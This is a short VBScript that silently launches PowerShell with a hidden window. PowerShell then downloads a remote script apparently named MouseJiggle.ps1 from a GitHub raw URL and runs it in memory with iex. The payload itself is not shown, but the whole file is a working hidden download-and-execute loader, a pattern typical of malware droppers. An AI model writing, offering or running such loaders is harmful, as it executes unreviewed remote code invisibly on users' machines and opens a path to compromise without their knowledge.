Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -NoProfile -WindowStyle Hidden -Command ""iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ertvg/h/refs/heads/main/MouseJiggle.ps1')""", 0, False
